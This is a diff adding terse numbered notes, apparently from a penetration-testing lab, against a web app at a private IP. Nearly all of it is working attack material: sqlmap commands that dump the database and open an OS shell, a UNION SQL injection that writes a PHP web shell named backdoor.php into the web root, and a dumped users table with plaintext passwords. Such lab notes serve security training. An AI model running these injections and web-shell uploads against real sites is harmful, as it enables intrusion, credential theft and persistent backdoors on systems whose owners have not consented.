@@ -1,0 +1,19 @@
+1.
+sqlmap -u http://10.11.8.148/comment.php?id=738 --dbms=mysql --dump --threads=5
+2.
+http://10.11.8.148/comment.php?=738 union all select 1,2,3,4, "<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+3.
+Database: webappdb
+Table: users
+[3 entries]
++----+--------+---------+----------+
+| id | name   | country | password |
++----+--------+---------+----------+
+| 1  | offsec | US      | 123456   |
+| 2  | secret | UK      | password |
+| 3  | backup | CA      | backup12 |
++----+--------+---------+----------+
+
+
+4.
+sqlmap -u http://10.11.8.148/comment.php?id=738 --dbms=mysql --os-shell
